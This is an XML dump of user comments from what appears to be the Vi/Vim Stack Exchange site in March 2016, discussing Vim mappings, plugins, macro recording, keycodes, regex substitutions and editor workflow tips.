  <row Id="11424" PostId="6992" Score="4" Text="Instead of a global `AFunction()` I like to use `s:a_function()` − this is more localized  and doesn't appear in tab completions and such..." CreationDate="2016-03-23T14:51:27.597" UserId="51" />
  <row Id="11425" PostId="6983" Score="1" Text="I don't think it will help because of the first few words of the first line of the question." CreationDate="2016-03-23T14:52:00.733" UserId="859" />
  <row Id="11426" PostId="6982" Score="0" Text="One of my favorite commands uses both g and z.  :g/pattern/z#.2" CreationDate="2016-03-23T14:52:08.370" UserId="895" />
  <row Id="11428" PostId="6968" Score="0" Text="damn.. I personally have folding turned off in my config with a profane comment regarding my feelings towards the feature :| hopefully a bit more regex hacking can get things working (id check plugins [grep fold keywords] if its almost there)" CreationDate="2016-03-23T15:06:13.297" UserId="2189" />
  <row Id="11429" PostId="6993" Score="1" Text="I'm not sure I understand what you mean by &quot;attaching a macro to the space bar&quot;. A macro can be recorded in the registers `{0-9a-zA-Z&quot;}` not in `space`. To change the behavior of the space bar in insert mode you can remap it with `inoremap &lt;Space&gt; [...]` is that what you are talking about? If so the answer is `inoremap` will change the behavior of the space bar only in insert mode, while `nnoremap` will change the behavior in normal mode." CreationDate="2016-03-23T15:20:56.110" UserId="1841" />
  <row Id="11430" PostId="6993" Score="0" Text="@statox Yes, that is what I am talking about, but I would want the mapping to work in command mode, so maybe it is not feasible without breaking the normal functionality." CreationDate="2016-03-23T15:24:45.727" UserId="6952" />
  <row Id="11431" PostId="6993" Score="1" Text="When you say you want the mapping to work in command mode, you mean when typing `:echo` (or any other command) and then pressing `Space` you want the space bar to do something else than inserting only one space?" CreationDate="2016-03-23T15:27:18.660" UserId="1841" />
  <row Id="11432" PostId="6993" Score="0" Text="@statox I meant normal mode, I updated my answer." CreationDate="2016-03-23T16:03:30.717" UserId="6952" />
  <row Id="11433" PostId="6934" Score="0" Text="This is the main selling point of neovim. I'd highly recommend giving that a shot to have a full shell without limitations (well some limitations but much less than `:shell`). `:vsplit term://zsh` is a pretty nice feature IMO. I just ran into a scripting problem around this which I could assist with (open terminal mode and insert into a `nonmodifiable` ) [some fun stuff..]" CreationDate="2016-03-23T16:05:25.053" UserId="2189" />
  <row Id="11434" PostId="6995" Score="4" Text="Doesn't wrapping the Plug statement inside an if block work? I use it successfully with Vundle to decide on a certain plugin for neovim and vim." CreationDate="2016-03-23T16:10:04.260" UserId="20" />
  <row Id="11435" PostId="6993" Score="1" Text="Ok it's more clear now. I think you can't get two different behaviors in the same mode. But a simple solution would be to use another mapping like `&lt; C-Space&gt;` for example." CreationDate="2016-03-23T16:12:01.690" UserId="1841" />
  <row Id="11436" PostId="6995" Score="0" Text="@tokoyami since apparently other Vimscript commands in can affect it (http://vi.stackexchange.com/q/6854/205), I'm a bit wary of using general Vimscript in the vim-plug block without knowing if it can affect vim-plug in other ways. It'd be nice if there were some vim-plug-sanctioned way." CreationDate="2016-03-23T16:13:49.383" UserId="205" />
  <row Id="11437" PostId="6995" Score="2" Text="You can use `if some_condition` in `vim-plug` blocks without problem." CreationDate="2016-03-23T16:16:15.003" UserId="1800" />
  <row Id="11438" PostId="6995" Score="1" Text="@VanLaser so what parts of Vimscript do I need to be careful of  in the vim-plug block? I don't think `a, b` is regular Vim syntax for anything in command arguments, so just seeing the use of a `,` made me wonder at first - and then the `autocmd` bit made me more nervous." CreationDate="2016-03-23T16:20:50.340" UserId="205" />
  <row Id="11439" PostId="6995" Score="3" Text="I mean something like what you see in this picture: http://vi.stackexchange.com/a/4184/1800, but instead of using `executable`, you can check some other Vim or environmental variable (such as the host name)." CreationDate="2016-03-23T16:22:26.687" UserId="1800" />
  <row Id="11440" PostId="6995" Score="2" Text="@VanLaser It is rather straightforward, then. Thanks!" CreationDate="2016-03-23T16:26:20.467" UserId="205" />
  <row Id="11441" PostId="6995" Score="0" Text="You're welcome :)" CreationDate="2016-03-23T16:27:02.220" UserId="1800" />
  <row Id="11442" PostId="6999" Score="0" Text="Nice! BTW, are you http://stackoverflow.com/users/813602/ingo-karkat or are there disproportionately many Vim masters named Ingo?" CreationDate="2016-03-23T16:59:48.927" UserId="2038" />
  <row Id="11443" PostId="6999" Score="0" Text="@CiroSantilli六四事件法轮功包卓轩 the latter, perhaps: http://vi.stackexchange.com/users/970/ingo-karkat" CreationDate="2016-03-23T17:08:42.797" UserId="205" />
  <row Id="11444" PostId="7000" Score="3" Text="`gg=G` is a normal mode command. Use `normal gg=G`." CreationDate="2016-03-23T17:11:06.720" UserId="205" />
  <row Id="11445" PostId="7000" Score="4" Text="@muru You typically want to use `normal!` to make sure you're not running user-defined mappings." CreationDate="2016-03-23T17:13:15.773" UserId="51" />
  <row Id="11446" PostId="7000" Score="0" Text="@Carpetsmoker of course! My, bad." CreationDate="2016-03-23T17:14:44.313" UserId="205" />
  <row Id="11447" PostId="7000" Score="4" Text="Take a look at `:retab` and `:retab!`." CreationDate="2016-03-23T17:50:36.280" UserId="15" />
  <row Id="11448" PostId="6996" Score="0" Text="The &lt;enter&gt; cannot hold it is too late꙰ⷭⷵ" CreationDate="2016-03-23T19:06:49.363" UserId="6882" />
  <row Id="11449" PostId="7006" Score="3" Text="IMHO it would be a bad idea - &quot;recording&quot;, in that case, would became a false name :) Don't know what you are trying to do, but perhaps asking that question could provide different ways to solve it." CreationDate="2016-03-23T19:21:07.833" UserId="1800" />
  <row Id="11450" PostId="7006" Score="0" Text="@VanLaser What do you mean by false name?" CreationDate="2016-03-23T19:35:55.250" UserId="2920" />
  <row Id="11451" PostId="7006" Score="1" Text="If a Vim action is different when you're recording it, it means the recording process itself affects the action, when it should only &quot;store&quot; it for later repetition. What do you expect to happen when you run the macro?" CreationDate="2016-03-23T19:39:24.710" UserId="1800" />
  <row Id="11452" PostId="7007" Score="0" Text="I don't really see how it solves the problem: when you finish recording your macro a string is saved in  the register but how do you differentiate when the register contains a macro or when it contains something coming from a yank command for example. Also the register is saved as one shot when you finish recording so when you see that the content of the register has changed you're not in recording mode anymore." CreationDate="2016-03-23T20:28:59.883" UserId="1841" />
  <row Id="11453" PostId="7007" Score="0" Text="My hope was that you'd be able to use something like the blackhole register (a register that is not going to be yanked to ever). If you have that register locked down then you could checkout CursorHold which has some special behavior when in recording mode (will update my answer with some more info to see if that helps ya)" CreationDate="2016-03-23T20:59:45.930" UserId="2189" />
  <row Id="11454" PostId="7007" Score="0" Text="added some info on the other registers (way to avoid conflicts with yank) and a hint on how we might be able to catch &quot;recording&quot; with CursorHold not being active during macro recording. If you are still fighting this after those notes let me know and I can try to implement it after work is over. As a note the `blackhole register` was only mentioned as a hint and an interesting vim tidbit that might lead to something (it would not be useful to use when recording macros; as @_ is not usable. ) in fact you cant even attempt to save the macro to it.." CreationDate="2016-03-23T21:08:22.413" UserId="2189" />
  <row Id="11455" PostId="7009" Score="0" Text="I have confirmed this behavior." CreationDate="2016-03-23T21:08:31.143" UserId="6952" />
  <row Id="11456" PostId="6996" Score="0" Text="@leftaroundabout I don't understand :-)" CreationDate="2016-03-23T21:36:27.243" UserId="2038" />
  <row Id="11457" PostId="7003" Score="0" Text="How does this compare to ingo's answer: http://vi.stackexchange.com/a/6999/2038 At first sight, that is more readable (I understand the `ftplugin` vs `autocmd` part :-))" CreationDate="2016-03-23T21:38:22.330" UserId="2038" />
  <row Id="11458" PostId="7004" Score="1" Text="Something &quot;similar&quot; is possible either at OS level, or with special firmware in certain mechanical keyboards (I'm thinking at [Hasu's TMK](https://github.com/tmk/tmk_keyboard)). For example, you can then map Caps Lock to act as ESC if pressed and released alone, but to act as CTRL instead, if another key is pressed before Caps Lock release." CreationDate="2016-03-23T22:22:57.163" UserId="1800" />
  <row Id="11459" PostId="7003" Score="2" Text="You mentioned in your question that you don't want splits. Ingo's mapping opens the file in a new window and moves that window to a tab while my mapping doesn't create an intermediary window. Other than that, I'd say both get the job done. The choice is yours." CreationDate="2016-03-23T22:42:51.517" UserId="54" />
  <row Id="11460" PostId="7008" Score="6" Text="You might want to [avoid end-of-line comments](http://vi.stackexchange.com/a/6922/205)." CreationDate="2016-03-24T06:39:45.317" UserId="205" />
  <row Id="11461" PostId="6996" Score="0" Text="@leftaroundabout reminds me of that famous [so]  post about parsing HTML with regex … which itself derives from something else, not sure what." CreationDate="2016-03-24T06:42:04.370" UserId="205" />
  <row Id="11462" PostId="7001" Score="0" Text="Done. It works." CreationDate="2016-03-24T10:07:28.123" UserId="6953" />
  <row Id="11463" PostId="6996" Score="1" Text="@muru: it's originally from [a famous poem](https://en.wikisource.org/wiki/The_Second_Coming_%28Yeats%29)." CreationDate="2016-03-24T10:47:03.597" UserId="6882" />
  <row Id="11464" PostId="7015" Score="1" Text="Have you tried to  use ternjs directly? Then you could understand if the problem is with ternjs or the Vim plugin. You could also you try [the issue tracker](https://github.com/ternjs/tern_for_vim/search?q=loadEagerly&amp;type=Issues&amp;utf8=%E2%9C%93)?" CreationDate="2016-03-24T10:52:20.857" UserId="1405" />
  <row Id="11465" PostId="7015" Score="0" Text="@mMontu I didn't know it was possible to use ternjs directly but good idea, I will take a look. From what I have read in the issue threads loadEagerly works - and people have since moved on to discussions like *how do I get `**/*` patterns to work with loadEagerly or sometimes pattern A works but sometimes I need pattern B etc... But noone has seemed to raise the issue that `loadEagerly` is totally broken. But maybe for vim it is...?" CreationDate="2016-03-24T11:03:07.867" UserId="4603" />
  <row Id="11466" PostId="7015" Score="0" Text="Probably this Vim plugin just provide an easier interface for the ternjs, so the `loadEagerly` is probably just transferred by the plugin. There are [more issues on ternjs about the `loadEagerly`](https://github.com/ternjs/tern/search?q=loadEagerly&amp;type=Issues&amp;utf8=%E2%9C%93) than in the plugin." CreationDate="2016-03-24T11:23:10.753" UserId="1405" />
  <row Id="11467" PostId="7014" Score="1" Text="I don't think it's possible (could use a source code patch ..). What I do is to look at the right-bottom side of Vim window to check for the partially introduced command letters, which show up there (with `showcmd` setting on). I also disable all timeouts and the `esckeys` option (this keeps Vim snappy but allows me to think at what I want to do in op-pending mode for example)." CreationDate="2016-03-24T11:29:30.197" UserId="1800" />
  <row Id="11468" PostId="7014" Score="1" Text="@VanLaser Yeah, but I like the cursor ;-)" CreationDate="2016-03-24T11:31:27.980" UserId="51" />
  <row Id="11469" PostId="7014" Score="0" Text="Hehe, I can understand that :)" CreationDate="2016-03-24T11:31:57.227" UserId="1800" />
  <row Id="11470" PostId="7014" Score="0" Text="I know C/C++, offer a $ bounty and I may try to implement it in Vim source code, if possible :D" CreationDate="2016-03-24T11:32:34.887" UserId="1800" />
  <row Id="11471" PostId="7023" Score="0" Text="Thank you! I see don't have this feature compiled in, so I'll recompile. Hopefully it's the same in neovim." CreationDate="2016-03-24T13:49:52.740" UserId="4505" />
  <row Id="11472" PostId="7023" Score="3" Text="@Lawrence I may be wrong, but I think neovim doesn't implement the `+clientserver` feature (https://github.com/tpope/vim-dispatch/issues/163#issuecomment-175383047). If that's the case, maybe this plugin would help you: https://github.com/mhinz/neovim-remote" CreationDate="2016-03-24T14:09:30.380" UserId="6960" />
  <row Id="11473" PostId="7023" Score="0" Text="It seems that this has the same effect as sending keys with tmux, and depends on knowing which mode the vim server is in (the example assumes normal mode).  Ideally, I'd want to be able to set a variable directly." CreationDate="2016-03-24T14:44:35.517" UserId="4505" />
  <row Id="11474" PostId="7018" Score="1" Text="Very related: [How to disable horizontal scrolling?](http://vi.stackexchange.com/q/2883/51) ... possible duplicate?" CreationDate="2016-03-24T14:58:47.267" UserId="51" />
  <row Id="11475" PostId="7008" Score="0" Text="@muru why? putting comments on separate lines makes the config file a lot more spread out and confusing to read because some lines are code, others are comments" CreationDate="2016-03-24T15:13:14.353" UserId="6952" />
  <row Id="11476" PostId="7008" Score="0" Text="Because it might cause problems in map statements. And a personal preference of vertical spread over horizontal." CreationDate="2016-03-24T15:16:42.803" UserId="205" />
  <row Id="11477" PostId="7018" Score="0" Text="@Carpetsmoker if I read that right, there's no way to disable it?" CreationDate="2016-03-24T15:17:42.970" UserId="205" />
  <row Id="11479" PostId="7018" Score="0" Text="Not as far as I − or apparently anyone else − was able to figure out... :-/" CreationDate="2016-03-24T15:19:40.957" UserId="51" />
  <row Id="11480" PostId="7018" Score="0" Text="@Carpetsmoker Sigh. Conceal was showing so much promise. I think I'll go back to removing backspaces. :/" CreationDate="2016-03-24T15:23:03.240" UserId="205" />
  <row Id="11481" PostId="7018" Score="0" Text="Conceal unfortunately has some quirks, like this one (there are others) ... The implementation is rather hackish :-/" CreationDate="2016-03-24T15:31:34.407" UserId="51" />
  <row Id="11482" PostId="7005" Score="0" Text="if the answer is sufficient can you accept it? If you have additional questions just let me know and ill do my best to update the answer" CreationDate="2016-03-24T16:04:22.683" UserId="2189" />
  <row Id="11483" PostId="7013" Score="0" Text="The problem with this (and with ctags) is that I need to be inside the function definition for it to work. Ideally, I would like to be anywhere in my file and start searching for a function name by writing. It is pretty much how the plugin CtrlP works, except it does it by file names instead. Do you know of a solution?" CreationDate="2016-03-24T16:38:23.300" UserId="6957" />
  <row Id="11484" PostId="7012" Score="0" Text="Thank you for your answer! Im using ctags already but it doesn't really do what I want. I've added a comment in Philipp's answer :)" CreationDate="2016-03-24T16:39:31.617" UserId="6957" />
  <row Id="11485" PostId="7013" Score="0" Text="Now I understand what you mean, I immediately thought of my answer because of your 'goto definition' formulation in the question title." CreationDate="2016-03-24T17:09:45.017" UserId="6495" />
  <row Id="11486" PostId="7013" Score="0" Text="So in this case I would recommend the [tagbar plugin] (https://github.com/majutsushi/tagbar). I use it in a very similar way: Toggle the bar with a shortcut which gives me an automatically created list of function names and other tags. Like any other buffer, I can search it and jump to the definition with enter." CreationDate="2016-03-24T17:13:28.460" UserId="6495" />
  <row Id="11487" PostId="7026" Score="0" Text="Fantastic! That's exactly what I'm looking for. Thanks!" CreationDate="2016-03-24T17:18:46.003" UserId="2920" />
  <row Id="11488" PostId="7013" Score="0" Text="Ah! I had the plugin before but didn't use it to navigate by search. It is a little cumbersome, but will do for now. Thanks! :) Would you like to edit your answer to add this option as well so I can accept it?" CreationDate="2016-03-24T17:26:52.080" UserId="6957" />
  <row Id="11489" PostId="7013" Score="0" Text="Sure, thank you!" CreationDate="2016-03-24T17:40:46.690" UserId="6495" />
  <row Id="11490" PostId="7026" Score="2" Text="May want to use `\l` to lowercase the next letter in the substitution. e.g. `%s/\([a-z]\)\([A-Z]\)/\1_\l\2/g`. See `:h s/\l` for more information." CreationDate="2016-03-24T17:46:30.320" UserId="778" />
  <row Id="11491" PostId="7013" Score="1" Text="Some tips to make the workflow less 'cumbersome': Create a simple mapping to toggle the tagbar and open the search afterwards. Use the autoclose setting of the plugin. I am sure you can tweak it to your needs." CreationDate="2016-03-24T17:47:01.133" UserId="6495" />
  <row Id="11492" PostId="7026" Score="0" Text="@DJMcMayhem see Peter's suggestion, it should be useful for the camelcase conversion." CreationDate="2016-03-24T17:48:22.313" UserId="205" />
  <row Id="11494" PostId="7029" Score="1" Text="Nice. I'd given up on the `match*()` functions as being related to `:match`.  So, if I read this correctly, as with regular expressions in Vim, this is limited to 9 groups, and the list returned always has 10 entries, no matter how many groups were actually used?" CreationDate="2016-03-24T18:50:31.433" UserId="205" />
  <row Id="11495" PostId="7029" Score="1" Text="@muru I'm no expert, but I think so. At least in the help, they talk about `submatches, like &quot;\1&quot;, &quot;\2&quot;, etc. in :substitute`. And afaik, with `:substitute` you can only refer to 10 submatches." CreationDate="2016-03-24T18:53:40.313" UserId="6960" />
  <row Id="11496" PostId="7028" Score="1" Text="FYI:  `:h function-list` will list functions grouped by what they are used for" CreationDate="2016-03-24T18:57:27.427" UserId="778" />
  <row Id="11497" PostId="7028" Score="0" Text="@PeterRincker thanks, it's easy to zone out in the main list at `:h functions`." CreationDate="2016-03-24T19:02:42.910" UserId="205" />
  <row Id="11498" PostId="7020" Score="1" Text="I don't think this is possible for Vim in the general case. To distinguish `a b(c);`  as a function declaration or a variable declaration, you have to know whether `c` is a type. For just `a b`, it might be possible." CreationDate="2016-03-24T19:18:25.777" UserId="205" />
  <row Id="11499" PostId="7029" Score="0" Text="Yes, that's the correct error. Just a typo when I re-ran the commands for copying here." CreationDate="2016-03-24T19:20:06.173" UserId="205" />
  <row Id="11504" PostId="7033" Score="0" Text="I cannot repro this. Start with the usual debugging steps: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/205)" CreationDate="2016-03-24T20:41:19.137" UserId="205" />
  <row Id="11506" PostId="7033" Score="0" Text="@muru Thanks. I updated my question in reference to your advice." CreationDate="2016-03-24T22:00:42.717" UserId="6689" />
  <row Id="11507" PostId="7021" Score="0" Text="Hmm, the syntax highlighting are good, though I think vim *can* do as that like compilers to distinguish types, vars, and functions (which is my original thought) , it will definitely be complicated." CreationDate="2016-03-24T23:21:21.070" UserId="6380" />
  <row Id="11508" PostId="7007" Score="0" Text="I spent some time on this last night (post beer keyboard smashing) and found it incredibly difficult to figure out exactly when recording is occurring and ends. My hunch about `CursorHold` seems to be an impossible dream due to the lag of the `CursorHold`  actually happening (made a simple global increment to happen everytime to watch this). Still incredibly interested in coming up with a way to do this and will continue smashing my face against the keys till we have a solution.." CreationDate="2016-03-25T00:11:02.607" UserId="2189" />
  <row Id="11509" PostId="5081" Score="2" Text="It's worth noting that the *reason* this works is because `.*` is [greedy](http://stackoverflow.com/a/3075532/5419599)." CreationDate="2016-03-25T00:24:36.853" UserId="4676" />
  <row Id="11520" PostId="7007" Score="0" Text="In my opinion you don't have a thousand different options: you have to override the behavior of `q` and make it toggle a variable and start/stop recording. An autocomand can't be reliable here since no autocmd triggers on a key press, and it is not possible to make a polling function due to the monothread nature of Vim. Good luck with your future experimentations :-)" CreationDate="2016-03-25T06:41:04.227" UserId="1841" />
  <row Id="11523" PostId="7033" Score="1" Text="@Ethan I had a similar problem in the past, I solved it by upgrading netrw from the site of the author: http://www.drchip.org/astronaut/vim/index.html#NETRW" CreationDate="2016-03-25T08:11:19.730" UserId="6960" />
  <row Id="11524" PostId="7033" Score="0" Text="@Ethan To update, click on the title `Network Oriented Reading, Writing, and Browsing`, it should make you download a tarball whose name is `netrw.vba.gz`. Then, open it with Vim: `$ vim netrw.vba.gz`. Finally, source the current buffer: `:so%`." CreationDate="2016-03-25T08:32:47.210" UserId="6960" />
  <row Id="11532" PostId="7033" Score="0" Text="@user9433424 Ok, cool. Thanks a lot for the info." CreationDate="2016-03-25T13:59:00.440" UserId="6689" />
  <row Id="11533" PostId="7038" Score="0" Text="I have the same issue using https://github.com/jcgay/maven-color" CreationDate="2016-03-25T16:27:57.213" UserId="2510" />
  <row Id="11534" PostId="7042" Score="0" Text="anyway I can repeat that motion ? with a shortcut ?" CreationDate="2016-03-25T18:15:10.893" UserId="6877" />
  <row Id="11535" PostId="7042" Score="0" Text="@JamesFranco Sorry, I don't think I understand what you mean exactly. Could you, please, elaborate a little?" CreationDate="2016-03-25T19:09:36.043" UserId="20" />
  <row Id="11536" PostId="7042" Score="1" Text="I am familiar with the fact that issuing a number with Ctrl+e will scroll to the number of line however i wanted to know if after that I could repeat the last  navigation motion by any shortcut. For instance to repeat the last change made we use `.` . Is there any way to repeat that motion using a shortcut key ?" CreationDate="2016-03-25T19:37:12.143" UserId="6877" />
  <row Id="11537" PostId="7038" Score="0" Text="Can pipe the data through something like `col -b` to remove the color escape codes?" CreationDate="2016-03-25T19:45:10.377" UserId="778" />
  <row Id="11538" PostId="7042" Score="1" Text="[No. Motions don't have a repeat option like changes.](https://vi.stackexchange.com/questions/6929/repeating-the-last-move-using-w-followed-by) What my suggestion does is only allowing you to execute C-e 10 times by pressing it once. You can choose a different key combination for this &quot;shortcut&quot; if you want. But it will only be for it." CreationDate="2016-03-25T19:46:54.307" UserId="20" />
  <row Id="11539" PostId="7038" Score="0" Text="I would like to have the color during the build, color can be remove by `MAVEN_OPTS=&quot;$MAVEN_OPTS -Dmaven.color=false&quot;`. When I build C I have no issue with the color." CreationDate="2016-03-25T20:37:16.193" UserId="2510" />
  <row Id="11545" PostId="7039" Score="0" Text="And perhaps next you will ask, &quot;And the most correct way?&quot; :)" CreationDate="2016-03-26T00:19:44.110" UserId="1800" />
  <row Id="11546" PostId="7039" Score="0" Text="Not really a vi/Vim answer, but you may want to learn about vertical tabs.  For terminal-specific files they can be handy." CreationDate="2016-03-26T01:19:43.207" UserId="4676" />
  <row Id="11547" PostId="7039" Score="0" Text="@Wildcard, what are they?" CreationDate="2016-03-26T01:33:57.847" UserId="4505" />
  <row Id="11548" PostId="7039" Score="0" Text="See for yourself: `printf '%s\v%s\n' hello there` (at a command prompt)." CreationDate="2016-03-26T01:37:43.043" UserId="4676" />
  <row Id="11549" PostId="7043" Score="4" Text="When you insert a literal `&lt;S-F10&gt;` (`&lt;C-v&gt;&lt;S-F10&gt;` in insert mode), what is displayed? On my system, with Vim, I see: `^[[21;2~`. I can't use `&lt;S-F10&gt;` by default, because Vim doesn't recognize the previous sequence of keycodes, so I have to teach that it means `&lt;S-F10&gt;`. To do this, I have to write in my `vimrc`: `silent! exe &quot;set &lt;S-F10&gt;=\e[21;2~&quot;` The keycodes to the right of the equal sign are the same as the ones displayed when inserting a literal `&lt;S-F10&gt;`. Except for the leading `^[` which must be replaced by `\e` (escape keycode). After that I can use `&lt;S-F10&gt;`. Maybe that will help." CreationDate="2016-03-26T07:42:11.100" UserId="6960" />
  <row Id="11550" PostId="2901" Score="0" Text="Ok, I discovered that  https://github.com/tpope/vim-vinegar  by Tim Pope does the same thing (and other useful stuff), so I just installed it. I guess that guy knows Vim little better than me :)" CreationDate="2016-03-26T10:21:30.963" UserId="311" />
  <row Id="11552" PostId="7047" Score="2" Text="IIRC the &quot;e&quot; in `&lt;C-e&gt;` was originally intended as &quot;extra&quot;, as in &quot;extra lines&quot;. Not expose (although that of course also works well as mnemonic)." CreationDate="2016-03-26T11:03:19.667" UserId="51" />
  <row Id="11553" PostId="7043" Score="0" Text="@user9433424, thank you! that solved it. in nvim, shifting turns f1 to f13, etc." CreationDate="2016-03-26T11:46:42.553" UserId="4505" />
  <row Id="11555" PostId="6985" Score="0" Text="WORD completion with &quot;@&quot; in it doesn't work. Although its in the ASCII chart." CreationDate="2016-03-26T11:58:52.647" UserId="6919" />
  <row Id="11556" PostId="7024" Score="0" Text="From your answer I conclude that nothing can be done on my system. in iterm, c-tab produces nothing; in terminal, remapping tab also affects c-tab." CreationDate="2016-03-26T12:36:41.147" UserId="4505" />
  <row Id="11557" PostId="7045" Score="0" Text="thanks for your help, i have found a solution" CreationDate="2016-03-26T12:43:53.813" UserId="2510" />
  <row Id="11559" PostId="7048" Score="0" Text="[Also asked on Stack Overflow](http://stackoverflow.com/q/36234611/660921)." CreationDate="2016-03-26T13:38:40.157" UserId="51" />
  <row Id="11560" PostId="7050" Score="1" Text="This looks more like a fault in the input system. Ideally, this keycode shouldn't sent to the application until you've either completed it (by pressing `.`) or aborted it (usually by pressing space). It also doesn't seem like it's Vim that prints `®` (there's no mapping for this by default), but rather the terminal or OS." CreationDate="2016-03-26T13:53:14.903" UserId="51" />
  <row Id="11562" PostId="7052" Score="0" Text="If you do type the single quote twice, does it have the effect of moving the cursor to the other side of the auto-inserted quote?" CreationDate="2016-03-26T21:49:31.597" UserId="67" />
  <row Id="11571" PostId="6970" Score="1" Text="Have you tried this one https://github.com/pangloss/vim-javascript ?" CreationDate="2016-03-26T23:06:57.033" UserId="2510" />
  <row Id="11572" PostId="7053" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/37574/discussion-between-user1685095-and-muru)." CreationDate="2016-03-26T23:30:23.490" UserId="6634" />
  <row Id="11573" PostId="7056" Score="4" Text="Certainly related, possibly a duplicate: http://vi.stackexchange.com/q/6177/1841" CreationDate="2016-03-27T14:01:06.127" UserId="1841" />
  <row Id="11574" PostId="6976" Score="0" Text="@LucHermitte couldn't you just use `search(@/)` to get the last used regex instead of using `:normal! n`?&#xA;This would combine the benefits of both solutions." CreationDate="2016-03-27T14:06:26.853" UserId="3343" />
  <row Id="11575" PostId="7058" Score="3" Text="Try `command!` instead of `command`. Do you usually source your `vimrc` multiple times in a session?" CreationDate="2016-03-27T19:45:48.053" UserId="205" />
  <row Id="11576" PostId="7058" Score="0" Text="I have set an autocommand that source my vimrc every time I save it. This way I can check the changes without having to exit vim and opening it again." CreationDate="2016-03-27T20:04:33.087" UserId="5081" />
  <row Id="11577" PostId="7059" Score="2" Text="If you're just commenting out, what I usually do is: `&lt;c-v&gt;` at the start of the first line, select till the last line, then `I## &lt;esc&gt;`." CreationDate="2016-03-27T20:41:37.377" UserId="205" />
  <row Id="11578" PostId="6970" Score="1" Text="I have but that plugin appears to indent everything from scratch using custom VimScript functions instead of built in rules." CreationDate="2016-03-27T21:16:12.557" UserId="6911" />
  <row Id="11579" PostId="7059" Score="0" Text="If reaching for the `^` key is too far, `0` will also move to the beginning of the line." CreationDate="2016-03-27T21:35:01.830" UserId="67" />
  <row Id="11580" PostId="7058" Score="0" Text="Why exit Vim? Open a new instance in another terminal, or background Vim and start a new one. For testing vimrc, I'd strongly recommend running a new instance." CreationDate="2016-03-28T04:56:42.920" UserId="205" />
  <row Id="11581" PostId="7065" Score="0" Text="This place is not official by any means. Did you consider asking on the vim_dev mailing list and/or reading the source?" CreationDate="2016-03-28T09:57:09.750" UserId="54" />
  <row Id="11582" PostId="7065" Score="0" Text="... the latter being of, of course, the answer: &quot;Because that's how it was made&quot; :D" CreationDate="2016-03-28T10:30:31.793" UserId="1800" />
  <row Id="11583" PostId="7065" Score="0" Text="This makes me wonder: what could possibly require more than 20 arguments?" CreationDate="2016-03-28T11:02:19.563" UserId="1405" />
  <row Id="11584" PostId="7065" Score="2" Text="One can also argue that, if more than N arguments are needed, using a list or dictionary function argument instead would be clearly the alternative (more organized) solution. &quot;20&quot; is the &quot;enforce&quot; limit of this solution :)" CreationDate="2016-03-28T11:18:43.343" UserId="1800" />
  <row Id="11585" PostId="6976" Score="0" Text="@Ingo, Indeed, we could also use `search(@/)`. However, note that while this won't change the search register, it uses it. Somehow, it won't make any difference with `norm! n`." CreationDate="2016-03-28T11:38:01.983" UserId="626" />
  <row Id="11586" PostId="7065" Score="2" Text="I hereby declare that 4 should be the absolute maximum number of arguments." CreationDate="2016-03-28T12:09:56.987" UserId="54" />
  <row Id="11587" PostId="7068" Score="0" Text="http://stackoverflow.com/a/14225889/1945981" CreationDate="2016-03-28T13:31:07.607" UserId="6154" />
  <row Id="11588" PostId="7068" Score="1" Text="I'm not entirely sure what you mean with &quot;fusing registers&quot; (it is like [fusing a gopher?](https://youtu.be/uvC8YTtzehk?t=342)) but I think you mean `set clipboard=unnamed`?" CreationDate="2016-03-28T13:41:38.847" UserId="51" />
  <row Id="11589" PostId="7070" Score="0" Text="Organize a cagefight and whoever wins gets to determine the writing conventions ;-) Writing a script to do this *reliably* will be difficult − though not impossible − but probably outside the scope of an answer..." CreationDate="2016-03-28T14:40:16.533" UserId="51" />
  <row Id="11590" PostId="7070" Score="0" Text="The co-author is muscular student. I would not want to go into a fight nither with muscular nor with student. Would it make sense to do this semi-automatically? A script that would approximat this conversion would be great." CreationDate="2016-03-28T14:43:30.263" UserId="5919" />
  <row Id="11591" PostId="7070" Score="0" Text="Approximating could probably be done by using `gq` to break the lines, and `J` to join the lines back together. `vipJ` will run `J` on the &quot;inner paragraph&quot;." CreationDate="2016-03-28T14:46:15.957" UserId="51" />
  <row Id="11592" PostId="7070" Score="0" Text="`gq` is not a good idea in terms of `git`. Every little change in a paragraph will confuse `git`" CreationDate="2016-03-28T14:57:37.403" UserId="5919" />
  <row Id="11593" PostId="7065" Score="4" Text="&quot;First shalt thou take out the Holy Function, then shalt thou count arguments to three, no more, no less. Three shall be the number thou shalt count, and the number of the counting shall be three. Four shalt thou not count, neither count thou two, excepting that thou then proceed to three. Five is right out. Once the number three, being the third number, be reached, then callest thou thy Holy Function of Antioch towards thy foe, who being naughty in My sight, shall return it.&quot;" CreationDate="2016-03-28T16:14:54.987" UserId="205" />
  <row Id="11596" PostId="7067" Score="0" Text="`I` inserts before the first non-whitespace, not at the beginning of line." CreationDate="2016-03-28T19:33:02.640" UserId="4729" />
  <row Id="11597" PostId="7066" Score="0" Text="`I` inserts before the first non-whitespace, not at the beginning of line." CreationDate="2016-03-28T19:33:15.220" UserId="4729" />
  <row Id="11598" PostId="7070" Score="0" Text="Suggest a different &quot;fight&quot;: each of you should try to make a method to only convert the input text from the *other* format into the preferred one, using the scripting capabilities of the editor used. So you can use Vim, and he can use TeXMaker. And each keep a different `git` revision, in the preferred format." CreationDate="2016-03-28T21:49:20.630" UserId="1800" />
  <row Id="11599" PostId="7069" Score="2" Text="I think that the important question is:  is it the mad programmers, or the bunnies, who are in their sleep at the time of execution?" CreationDate="2016-03-28T22:50:03.933" UserId="2108" />
  <row Id="11600" PostId="7073" Score="4" Text="`\n` and `\e` can be used in place of `\&lt;CR&gt;` and `\&lt;Esc&gt;`, respectively, in an expression string - they're easier to type. Also, `\t` in place of `\&lt;Tab&gt;` and `\b` in place of `\&lt;BS&gt;`." CreationDate="2016-03-29T02:23:17.360" UserId="6206" />
  <row Id="11601" PostId="7073" Score="1" Text="@djjcast, yes the full list being available at [`:h string`](http://vimhelp.appspot.com/eval.txt.html#string)." CreationDate="2016-03-29T02:26:45.107" UserId="205" />
  <row Id="11602" PostId="7066" Score="1" Text="yup, that is true.. OP used `^`, so `I` would be suitable.." CreationDate="2016-03-29T03:49:30.673" UserId="1616" />
  <row Id="11604" PostId="7069" Score="2" Text="Bunnies! Bunnies! It must be BUNNIES! (BTW, the way to properly execute bunnies: `:command! Bunnies echo &quot;Squeeeak!&quot;`; `:execute &quot;Bunnies&quot;`)" CreationDate="2016-03-29T04:20:37.180" UserId="4729" />
